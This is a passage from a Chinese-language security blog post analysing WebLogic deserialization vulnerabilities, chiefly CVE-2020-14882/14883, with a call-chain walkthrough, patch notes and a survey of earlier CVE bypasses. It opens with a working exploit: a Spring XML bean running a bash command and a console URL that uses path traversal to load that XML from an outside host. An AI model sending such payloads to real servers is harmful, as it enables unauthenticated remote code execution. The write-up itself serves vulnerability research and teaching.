+            &lt;value&gt;bash&lt;/value&gt;
+            &lt;value&gt;-c&lt;/value&gt;
+            &lt;value&gt;&lt;![CDATA[touch /tmp/success2]]&gt;&lt;/value&gt;
+          &lt;/list&gt;
+        &lt;/constructor-arg&gt;
+    &lt;/bean&gt;
+&lt;/beans&gt;</code></pre>
+<pre><code class="shell">http://127.0.0.1:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=HomePage1&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://172.28.164.182:9000/evil.xml&quot;)</code></pre>
+<p><strong>漏洞分析</strong></p>
+<p>继续回到<code>createUIContext()</code>，我们跟进一下<code>setServletRequest()</code>函数</p>
+<p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211116183939028.png" alt="image-20211116183939028"></p>
+<p>当传入的<code>_nfpb</code>参数为<code>true</code>时，就会把<code>isPostback</code>设置为<code>true</code></p>
+<p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211116184255406.png" alt="image-20211116184255406"></p>
+<p>在创建完控件上下文之后调用<code>runLifecycle()</code>函数进入控件的生命周期</p>
+<img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112230430470.png" alt="image-20211112230430470" style="zoom:80%;" />
+
+<p>当<code>isOutBound</code>为<code>false</code>（默认）和<code>isPostback</code>为<code>true</code>时，就会调用<code>runInbound()</code>函数</p>
+<p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211116184719698.png" alt="image-20211116184719698"></p>
+<p>在<code>runInbound()</code>函数中会把<code>_inboundLifecycle</code>赋给<code>VisitorType</code>，每个<code>VisitorType</code>对应着该生命周期中的一个控件操作，其中<code>_inboundLifecycle</code>的第一个控件操作为<code>UIControl.init</code></p>
+<p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211116185044545.png" alt="image-20211116185044545"></p>
+<blockquote>
+<p>题外，其实这里的<code>_nfpb=true</code>并不是必须的，因为我们的核心是调用到<code>UIControl.init</code>控件操作，而<code>_outboundLifecycle</code>实际也有这个操作</p>
+<img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211116192941383.png" alt="image-20211116192941383" style="zoom:80%;" />
+</blockquote>
+<p>调用<code>walk()</code>来遍历<code>console.portal</code>文件中的控件节点并对其执行<code>VisitorType</code>中对应的操作</p>
+<p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211116185335651.png" alt="image-20211116185335651"></p>
+<p>跟进<code>walkRecursive()</code>函数</p>
+<p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112160156084.png" alt="image-20211112160156084"></p>
+<p>当遍历指针<code>visit</code>识别到有节点时就会调用<code>visit()</code>函数执行对应的控件操作</p>
+<p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211116190638412.png" alt="image-20211116190638412"></p>
+<p>而这里就是对控件进行初始化</p>
+<p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211116191217581.png" alt="image-20211116191217581"></p>
+<p>如果该节点具有子节点就继续调用<code>walkRecursive()</code>函数对子节点进行遍历</p>
+<p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211116185825460.png" alt="image-20211116185825460"></p>
+<p>遍历方向如下图所示</p>
+<p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211116191101845.png" alt="image-20211116191101845"></p>
+<p>在识别到<code>/PortalConfig/contentheader/ContentHeader_breadcrumbs.portlet</code>节点时，程序会调用<code>Portlet</code>类父类的初始化函数</p>
+<p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211113011922491.png" alt="image-20211113011922491"></p>
+<p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211113011937480.png" alt="image-20211113011937480"></p>
+<p>其中<code>Portlet</code>类的继承链和<code>init()</code>操作如下</p>
+<pre><code class="java">class Portlet extends class Window
+    super.init()
+class Window extends class EntitledUIControl
+    super.init()
+class EntitledUIControl extends class AdministeredBackableControl
+    init() &lt;== not exists
+class AdministeredBackableControl
+    init()</code></pre>
+<p>所以它最终会调用到<code>AdministeredBackableControl</code>的<code>init()</code>函数进行初始化</p>
+<img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112160001615.png" alt="image-20211112160001615" style="zoom:80%;" />
+
+<p><code>netuix_servlet.jar!\com\bea\netuix\servlets\controls\Backable.class#initializeBackingFile</code></p>
+<p>继续跟进它的<code>init()</code>函数</p>
+<p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211112155932230.png" alt="image-20211112155932230"></p>
+<p>这里是获取了我们传入的<code>handle</code>参数</p>
+<img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211112155806888.png" alt="image-20211112155806888" style="zoom:80%;" />
+
+<p>然后程序就可以初始化任意<code>handle</code>类</p>
+<p><img src="C:%5CUsers%5CTyao%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20211113002831750.png" alt="image-20211113002831750"></p>
+<p>其中<code>ShellSession</code>类的调用栈如下</p>
+<img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211113002623429.png" alt="image-20211113002623429" style="zoom:80%;" />
+
+<p>其中<code>FileSystemXmlApplicationContext</code>类的调用栈如下</p>
+<p>下载xml文件</p>
+<img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211113015257300.png" alt="image-20211113015257300" style="zoom:80%;" />
+
+<p>解析xml文件</p>
+<img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20211113015841997.png" alt="image-20211113015841997" style="zoom:80%;" />
+
+<p><strong>patch</strong></p>
+<ol>
+<li><p>官方对CVE-2020-14883的补丁是在com\bea\console\handles\HandleFactory#getHandle的方法中对传入的类的类型进行检查，是否为handle的子类。这里通过handle实现类<code>com.bea.console.handles.HandleImpl</code>的子类<code>com.bea.console.handles.JndiBindingHandle</code>的接收String的构造方法将jndi的url作为payload传入；单独这一点并不能实现RCE（之前虽然知道补丁的修复方式但是觉得单独这个无法RCE就没细看，谁知道可以结合其他点来实现RCE）。 </p>
+</li>
+<li><p>在com.bea.console.actions.jndi.JNDIBindingAction#execute方法中，构造了JndiBindingHandle对象，并通过获取jndi的payload，并进行了特定的拼接（这里根据其拼接方式进行特殊构造），调用javax.naming.Context#lookup实现了jndi注入导致的RCE。</p>
+</li>
+</ol>
+<h2 id="回显构造"><a href="#回显构造" class="headerlink" title="回显构造"></a>回显构造</h2><p>具体参考一下@Y4er师傅的<a target="_blank" rel="noopener" href="https://y4er.com/post/java-deserialization-echo/">文章</a></p>
+<ol>
+<li>defineClass</li>
+<li>RMI绑定实例</li>
+<li>URLClassLoader抛出异常</li>
+<li>中间件</li>
+<li>写文件css、js</li>
+<li>dnslog</li>
+</ol>
+<h2 id="思考总结"><a href="#思考总结" class="headerlink" title="思考总结"></a>思考总结</h2><ol>
+<li>只有实现了Serializable接口或Externalizable接口的类才能进行序列化</li>
+<li>被transient和static修饰的变量不参与修饰符，其值为null</li>
+<li>readResolve()方法如果被定义会在readObject()方法后被调用，修改反序列化的对象</li>
+<li>Externalizable接口定义了writeExternal()和readExternal()方法，对应Serializable接口的writeObject()和readObject()方法</li>
+<li>历史漏洞梳理，大部分新漏洞的造成都是对黑名单的绕过：<ul>
+<li>CVE-2015-4852、CVE2016-0638、CVE-2016-3510、CVE-2019-2890都是直接搜索能对ObjectInputStream直接进行操作的readObject()或者readExternal()方法</li>
+<li>CVE-2017-3248、CVE-2018-2628、CVE-2018-2893、CVE-2018-3245主要在RMI的前提下不断搜索RemoteObject相似子类来绕过，或者是直接绕过resolveProxyClass()的检查</li>
+<li>CVE-2020-2551运用T3协议和IIOP协议之间的差异进行绕过，关键的地方就是T3的resolveClass()方法会检查其父类，而IIOP的resolveClass()只会检查其本身类</li>
+<li>CVE-2020-2555、CVE-2020-2883、CVE-2020-14645挖掘出了一条新的extractor反射链并不断搜索能够调用此方法的相似类进行绕过</li>
+<li>CVE-2020-14644通过defineClass()来加载我们的恶意类，这是一个很巧妙的思路</li>
+<li>CVE-2017-3506、CVE-2017-10271、CVE-2019-2725、CVE-2019-2729是根据对标签的差异解析进行绕过，这需要对源码进行深入解读才可以</li>
+</ul>
+</li>
+</ol>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/TheTh1nk3r/articles/14506947.html">java反序列化漏洞（1）之反射机制</a></p>
+<p><a target="_blank" rel="noopener" href="https://b1ngz.github.io/java-deserialization-jdk7u21-gadget-note/">Java反序列 Jdk7u21 Payload 学习笔记</a></p>
+<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1516342">Weblogic反序列化历史漏洞全汇总</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/219985">CVE-2015-4852——WebLogic反序列化初探</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8443">从Weblogic原理上探究CVE-2015-4852、CVE-2016-0638、CVE-2016-3510究竟怎么一回事</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/column/203816.html">CVE-2017–10271漏洞原理分析</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/afanti/p/10222293.html">weblogic远程调试XMLDecoder RCE CVE-2017-10271</a></p>
+<p><a target="_blank" rel="noopener" href="http://xxlegend.com/2019/04/30/CVE-2019-2725%E5%88%86%E6%9E%90/">CVE-2019-2725分析</a></p>
+<p><a target="_blank" rel="noopener" href="http://galaxylab.pingan.com.cn/weblogic-cve-2019-2725%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">WebLogic | CVE-2019-2725反序列化漏洞分析</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/225137#h3-5">CVE-2017-3248——WebLogic反序列化初探</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8073">CVE-2018-2628 Weblogic反序列化漏洞分析</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/152164">CVE-2018-2893：Oracle WebLogic Server 远程代码执行漏洞分析预警</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/2479">Weblogic JRMP反序列化漏洞回顾</a></p>
+<p><a target="_blank" rel="noopener" href="https://kylingit.com/blog/cve-2019-2729-weblogic-xmldecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2019-2729 WEBLOGIC XMLDECODER反序列化漏洞分析</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/6904">Weblogic-T3-CVE-2019-2890-Analysis</a></p>
+<p><a target="_blank" rel="noopener" href="https://paper.seebug.org/1321/#cve-2020-2555">Weblogic12c T3 协议安全漫谈</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/213074">Weblogic 远程命令执行漏洞（CVE-2020-14644）分析</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/213248">Weblogic 远程命令执行漏洞（CVE-2020-14645）分析</a></p>
+<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7422">CVE-2020-2551: Weblogic IIOP反序列化漏洞分析</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/221752">CVE-2020-14882：Weblogic Console 权限绕过深入解析</a></p>
+<p><a target="_blank" rel="noopener" href="https://f5.pm/go-60295.html">Weblogic Console漏洞分析</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Tyaoo</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://tyaoo.github.io/2021/02/02/WebLogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/">https://tyaoo.github.io/2021/02/02/WebLogic%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/WebLogic/">WebLogic</a></div><div class="post_share"><div class="social-share" data-image="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/02/17/nonce-strict-dynamic-bypass/"><img class="prev-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info">CSP nonce&amp;strict-dynamic Bypass</div></div></a></div><div class="next-post pull-right"><a href="/2020/12/17/Vulnstack-%E7%BA%A2%E9%98%9F%E5%AE%9E%E6%88%98/"><img class="next-cover" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">Vulnstack 红队实战</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Tyaoo</div><div class="author-info__description"></div></div><div class="card-info-data is-center"><div class="card-info-data-item"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">35</div></a></div><div class="card-info-data-item"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">11</div></a></div><div class="card-info-data-item"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">0</div></a></div></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/Tyaoo"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9B%B8%E5%85%B3%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.</span> <span class="toc-text">相关协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6"><span class="toc-number">3.</span> <span class="toc-text">反射机制</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86"><span class="toc-number">4.</span> <span class="toc-text">动态代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ysoserial"><span class="toc-number">5.</span> <span class="toc-text">ysoserial</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TemplatesImpl"><span class="toc-number">6.</span> <span class="toc-text">TemplatesImpl</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#javassist"><span class="toc-number">6.1.</span> <span class="toc-text">javassist</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E9%93%BE"><span class="toc-number">6.2.</span> <span class="toc-text">调用链</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload"><span class="toc-number">6.3.</span> <span class="toc-text">payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">7.</span> <span class="toc-text">环境搭建</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#weblogic-10-3-6-0"><span class="toc-number">7.1.</span> <span class="toc-text">weblogic: 10.3.6.0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#weblogic-12-2-1-4"><span class="toc-number">7.2.</span> <span class="toc-text">weblogic: 12.2.1.4</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">8.</span> <span class="toc-text">漏洞分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">8.1.</span> <span class="toc-text">JAVA反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2015-4852"><span class="toc-number">8.1.1.</span> <span class="toc-text">CVE-2015-4852</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2016-0638"><span class="toc-number">8.1.2.</span> <span class="toc-text">CVE-2016-0638</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2016-3510"><span class="toc-number">8.1.3.</span> <span class="toc-text">CVE-2016-3510</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2017-3248"><span class="toc-number">8.1.4.</span> <span class="toc-text">CVE-2017-3248</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2018-2628"><span class="toc-number">8.1.5.</span> <span class="toc-text">CVE-2018-2628</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2018-2893"><span class="toc-number">8.1.6.</span> <span class="toc-text">CVE-2018-2893</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2018-3245"><span class="toc-number">8.1.7.</span> <span class="toc-text">CVE-2018-3245</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2019-2890"><span class="toc-number">8.1.8.</span> <span class="toc-text">CVE-2019-2890</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2020-2551"><span class="toc-number">8.1.9.</span> <span class="toc-text">CVE-2020-2551</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2020-2555"><span class="toc-number">8.1.10.</span> <span class="toc-text">CVE-2020-2555</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2020-2883"><span class="toc-number">8.1.11.</span> <span class="toc-text">CVE-2020-2883</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2020-14644"><span class="toc-number">8.1.12.</span> <span class="toc-text">CVE-2020-14644</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2020-14645"><span class="toc-number">8.1.13.</span> <span class="toc-text">CVE-2020-14645</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#XML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">8.2.</span> <span class="toc-text">XML反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2017-3506"><span class="toc-number">8.2.1.</span> <span class="toc-text">CVE-2017-3506</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2017-10271"><span class="toc-number">8.2.2.</span> <span class="toc-text">CVE-2017-10271</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2019-2725"><span class="toc-number">8.2.3.</span> <span class="toc-text">CVE-2019-2725</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2019-2729"><span class="toc-number">8.2.4.</span> <span class="toc-text">CVE-2019-2729</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2020-14882"><span class="toc-number">8.2.5.</span> <span class="toc-text">*CVE-2020-14882</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#CVE-2020-14883"><span class="toc-number">8.2.6.</span> <span class="toc-text">CVE-2020-14883</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9E%E6%98%BE%E6%9E%84%E9%80%A0"><span class="toc-number">9.</span> <span class="toc-text">回显构造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%80%83%E6%80%BB%E7%BB%93"><span class="toc-number">10.</span> <span class="toc-text">思考总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">11.</span> <span class="toc-text">参考</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/12/06/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/" title="Tomcat内存马"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Tomcat内存马"/></a><div class="content"><a class="title" href="/2021/12/06/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/" title="Tomcat内存马">Tomcat内存马</a><time datetime="2021-12-06T07:51:42.000Z" title="Created 2021-12-06 15:51:42">2021-12-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/09/25/Handlebars-AST%E6%B3%A8%E5%85%A5/" title="Handlebars AST注入"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Handlebars AST注入"/></a><div class="content"><a class="title" href="/2021/09/25/Handlebars-AST%E6%B3%A8%E5%85%A5/" title="Handlebars AST注入">Handlebars AST注入</a><time datetime="2021-09-25T08:34:23.000Z" title="Created 2021-09-25 16:34:23">2021-09-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/06/30/Dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/" title="Dubbo反序列化漏洞研究"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Dubbo反序列化漏洞研究"/></a><div class="content"><a class="title" href="/2021/06/30/Dubbo%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/" title="Dubbo反序列化漏洞研究">Dubbo反序列化漏洞研究</a><time datetime="2021-06-30T05:12:31.000Z" title="Created 2021-06-30 13:12:31">2021-06-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/06/03/Yii2%E6%9C%80%E6%96%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE%E5%88%86%E6%9E%90/" title="Yii2最新反序列化POP链分析"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Yii2最新反序列化POP链分析"/></a><div class="content"><a class="title" href="/2021/06/03/Yii2%E6%9C%80%E6%96%B0%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE%E5%88%86%E6%9E%90/" title="Yii2最新反序列化POP链分析">Yii2最新反序列化POP链分析</a><time datetime="2021-06-03T15:09:56.000Z" title="Created 2021-06-03 23:09:56">2021-06-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/05/28/Laravel-Debug-mode-RCE%E5%A4%8D%E7%8E%B0/" title="Laravel Debug mode RCE复现"><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Laravel Debug mode RCE复现"/></a><div class="content"><a class="title" href="/2021/05/28/Laravel-Debug-mode-RCE%E5%A4%8D%E7%8E%B0/" title="Laravel Debug mode RCE复现">Laravel Debug mode RCE复现</a><time datetime="2021-05-28T06:15:46.000Z" title="Created 2021-05-28 14:15:46">2021-05-28</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Tyaoo</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">Local search</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  Loading the Database</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="Search for Posts" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false});</script></body></html>
